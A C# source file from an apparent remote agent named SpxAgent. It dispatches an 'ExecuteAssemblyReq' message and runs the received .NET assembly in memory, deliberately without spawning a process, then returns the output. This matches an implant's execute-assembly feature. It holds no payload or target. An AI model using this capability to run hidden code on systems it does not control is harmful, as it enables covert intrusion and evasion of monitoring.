using System.Text.Json;
using SpxAgent.Exec;

namespace SpxAgent;

// Execution command handlers: in-memory .NET assembly loading (no process
// spawn). Request/response field names follow the SPX contract
// docs/spx-protocol.md (protojson lowerCamelCase).
public static class ExecCommands
{
    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        DefaultIgnoreCondition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingNull,
    };

    public static (string Msg, JsonElement Body)? Dispatch(string msg, JsonElement? body)
    {
        return msg switch
        {
            "ExecuteAssemblyReq" => ExecuteAssembly(body),
            _ => null,
        };
    }

    private static (string, JsonElement)? ExecuteAssembly(JsonElement? body)
    {
        string? err = null;
        byte[] output = Array.Empty<byte>();
        try
        {
            byte[] assembly = GetBytes(body, "assembly") ?? throw new ArgumentException("missing assembly");
            string[] args = GetStringArray(body, "arguments");
            string? className = GetString(body, "className");
            string? method = GetString(body, "method");

            output = AssemblyRunner.Execute(assembly, args, className, method);
        }
        catch (System.Reflection.TargetInvocationException tie) when (tie.InnerException is not null)
        {
            err = tie.InnerException.ToString();
        }
        catch (Exception ex)
        {
            err = ex.ToString();
        }

        var payload = new Dictionary<string, object>
        {
            ["output"] = output,
        };
        if (err is not null)
            payload["response"] = new Dictionary<string, object> { ["err"] = err };

        return ("ExecuteAssembly", JsonSerializer.SerializeToElement(payload, JsonOpts));
    }

    // ---------- protojson helpers (mirror FsCommands) ----------

    private static string? GetString(JsonElement? body, string name)
    {
        if (body is not JsonElement el || el.ValueKind != JsonValueKind.Object) return null;
        if (!el.TryGetProperty(name, out JsonElement v)) return null;
        return v.ValueKind == JsonValueKind.String ? v.GetString() : v.ToString();
    }

    private static byte[]? GetBytes(JsonElement? body, string name)
    {
        if (body is not JsonElement el || el.ValueKind != JsonValueKind.Object) return null;
        if (!el.TryGetProperty(name, out JsonElement v)) return null;
        return v.ValueKind == JsonValueKind.String ? Convert.FromBase64String(v.GetString()!) : null;
    }

    private static string[] GetStringArray(JsonElement? body, string name)
    {
        if (body is not JsonElement el || el.ValueKind != JsonValueKind.Object) return Array.Empty<string>();
        if (!el.TryGetProperty(name, out JsonElement v) || v.ValueKind != JsonValueKind.Array)
            return Array.Empty<string>();
        var list = new List<string>();
        foreach (JsonElement item in v.EnumerateArray())
            if (item.ValueKind == JsonValueKind.String) list.Add(item.GetString()!);
        return list.ToArray();
    }
}
